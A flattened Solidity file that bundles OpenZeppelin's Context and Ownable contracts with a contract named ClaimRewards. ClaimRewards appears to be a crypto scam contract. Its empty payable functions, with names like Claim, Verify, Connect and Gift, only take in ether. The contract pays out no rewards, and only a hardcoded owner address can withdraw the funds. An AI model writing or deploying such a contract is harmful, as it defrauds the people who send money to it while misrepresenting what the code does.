// File: @openzeppelin/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol
// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contracts/main.sol

pragma solidity ^0.8.0;

contract ClaimRewards is Ownable {

    constructor() {
        // The Ownable constructor sets the owner to the address that deploys the contract
        transferOwnership(0x8878F1b6ccaC23B0B8A4C4af4D1F7F494c3e254d);
    }

    function withdraw(uint256 amount, address recipient) public onlyOwner {
        require(amount <= address(this).balance, "Requested amount exceeds the contract balance.");
        require(recipient != address(0), "Recipient address cannot be the zero address.");
        payable(recipient).call{value: amount}("");
    }

    function Claim() public payable {
    }

    function Confirm() public payable {
    }

    function Verify() public payable {
    }
    
    function Connect() public payable {
    }

    function Start() public payable {
    }

    function Gift() public payable {
    }

    function Enable() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}